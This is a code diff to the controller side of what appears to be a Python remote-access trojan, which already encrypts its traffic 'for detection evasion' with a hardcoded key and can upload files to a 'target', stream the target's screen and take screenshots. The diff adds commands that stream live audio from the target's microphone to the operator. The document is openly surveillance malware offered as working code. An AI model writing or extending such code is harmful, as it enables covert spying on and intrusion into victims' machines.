@@ -9,14 +9,20 @@ import datetime  # For timestamping
 import socket  # This library is used for creating socket connections.
 import json  # JSON is used for encoding and decoding data in a structured format.
 import os  # This library allows interaction with the operating system.
+import ctypes
+from ctypes import c_char_p, c_int, CFUNCTYPE
+import pyaudio
+import threading
 from cryptography.fernet import Fernet  # Encrypted communication for detection evasion
 import cv2 # (OpenCV) shows the image in a live window.
 import numpy as np # helps decode the raw JPEG bytes into an image array.
 import threading
 
+
 # Pre-shared key for encryption
 psk_aes = b'-SDf80BDeTTeY7jFiydQshGVwpufGx4S9J2sANAJWrI=' # Hardcoded cuz I couldn't careless :P
 cipher = Fernet(psk_aes)  # Create a Fernet cipher object for encryption
+
 
 # Function to send data in a reliable way (encoded as JSON)
 def reliable_send(data):
@@ -25,6 +31,7 @@ def reliable_send(data):
     data_len = len(encrypted_data)
     target.sendall(data_len.to_bytes(4, 'big'))  # Send 4-byte length prefix
     target.sendall(encrypted_data)
+
 
 
 # Function to receive data in a reliable way (expects JSON data)
@@ -41,6 +48,7 @@ def reliable_recv():
         data += packet
     decrypted_data = cipher.decrypt(data)
     return json.loads(decrypted_data.decode())
+
 
 # Function to upload a file to the target machine
 def upload_file(file_name):
@@ -103,6 +111,43 @@ def receive_screen_stream():
         cv2.destroyAllWindows()
 
 
+ERROR_HANDLER_FUNC = CFUNCTYPE(None, c_char_p, c_int, c_char_p, c_int, c_char_p)
+
+def py_error_handler(filename, line, function, err, fmt):
+    pass  # suppress all ALSA errors
+
+c_error_handler = ERROR_HANDLER_FUNC(py_error_handler)
+
+try:
+    asound = ctypes.cdll.LoadLibrary('libasound.so')
+    asound.snd_lib_error_set_handler(c_error_handler)
+except OSError:
+    pass  # libasound not found, skip suppression
+
+def stream_audio_from_target(flag):
+    CHUNK = 1024
+    FORMAT = pyaudio.paInt16
+    CHANNELS = 1
+    RATE = 11025
+
+    p = pyaudio.PyAudio()
+    stream = p.open(format=FORMAT, channels=CHANNELS,
+                    rate=RATE, output=True, frames_per_buffer=CHUNK)
+
+    try:
+        while flag['on']:
+            data = target.recv(CHUNK)
+            if not data:
+                break
+            stream.write(data)
+    except:
+        pass
+    finally:
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
+
+
 # Function for the main communication loop with the target
 def target_communication():
     while True:
@@ -125,6 +170,16 @@ def target_communication():
         elif command[:6] == 'upload':
             # If the user enters 'upload', initiate the upload of a file to the target.
             upload_file(command[7:])
+        elif command == 'listening_start':
+            stream_flag = {'on': False}
+            if not stream_flag['on']:
+                stream_flag['on'] = True
+                audio_thread = threading.Thread(target=stream_audio_from_target, args=(stream_flag,))
+                audio_thread.start()
+            result = reliable_recv()
+            print(result)
+        elif command == 'listening_stop':
+            stream_flag['on'] = False
         elif command == 'screenshot':
             # If the user enters 'screenshot', send a command to take a screenshot on the target.
             shot = reliable_recv()
